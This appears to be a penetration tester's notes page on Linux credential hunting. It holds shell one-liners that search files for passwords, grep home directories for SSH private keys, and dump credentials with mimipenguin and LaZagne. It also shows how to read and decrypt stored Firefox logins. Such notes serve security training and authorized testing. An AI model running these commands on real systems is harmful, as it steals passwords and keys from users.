# Credential Hunting in Linux

Look for common things like Files, history, Memory, Key-Rings (browser-creds)

### History

`.bash_history`

`.bashrc`

`.bash_profile`

### Conf file

```shell-session
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```

### Creds in conf file

```shell-session
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```

### Database search

```shell-session
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```


### txt search

```shell-session
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```

### Search scripts


```shell-session
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```


### Cronjobs

```shell-session
 cat /etc/crontab
 
 ls -la /etc/cron.*/
```

### SSH Keys

```shell-session
grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
```

```shell-session
grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
```

### Memory and Cache

```shell-session
sudo python3 mimipenguin.py
```

Also available in bash

[https://github.com/huntergregal/mimipenguin](https://github.com/huntergregal/mimipenguin)

### LaZagne

```shell-session
sudo python2.7 laZagne.py all
```

can also give browser option

### Browser creds

when we store credentials for a web page in the Firefox browser, they are encrypted and stored in `logins.json` on the system. However, this does not mean that they are safe there.

```shell-session
ls -l .mozilla/firefox/ | grep default 
```
![[image 17.png]]



```shell-session
cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
```
![[image 18.png]]


```shell-session
 python3.9 firefox_decrypt.py
```
![[image 19.png]]

## Passwd, Shadow & .bak file
